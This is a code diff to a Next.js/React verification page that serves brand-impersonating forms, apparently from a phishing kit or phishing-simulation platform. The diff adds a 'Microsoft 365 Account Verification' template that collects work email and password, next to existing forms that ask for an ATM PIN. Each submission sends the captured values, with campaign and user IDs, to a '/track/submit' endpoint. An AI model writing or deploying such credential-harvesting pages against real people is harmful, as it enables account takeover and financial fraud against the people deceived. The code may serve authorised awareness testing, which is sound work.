@@ -4,7 +4,6 @@
 
 import { useState } from 'react';
 import { useParams, useSearchParams } from 'next/navigation';
-
 const API_BASE = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000/api';
 
 const pageConfigs: Record<string, {
@@ -36,6 +35,18 @@ const pageConfigs: Record<string, {
       { name: 'pin',           label: 'ATM PIN',                 type: 'password', placeholder: '4-digit PIN' },
     ],
   },
+
+  office365: {
+  title: 'Microsoft 365 Account Verification',
+  logo: '🪟',
+  headerColor: 'bg-blue-600',
+  buttonText: 'Verify Account',
+  fields: [
+    { name: 'email',    label: 'Work or School Email', type: 'email',    placeholder: 'name@company.com' },
+    { name: 'password', label: 'Password',             type: 'password', placeholder: 'Enter password' },
+  ],
+},
+
   package_delivery: {
     title: 'Confirm Your Delivery',
     logo: '📦',
@@ -114,6 +125,7 @@ export default function VerifyPage() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
+    
 
     try {
       await fetch(`${API_BASE}/track/submit`, {
@@ -124,6 +136,7 @@ export default function VerifyPage() {
           campaignId,
           userId,
           ...formValues,
+          
         }),
       });
     } catch {
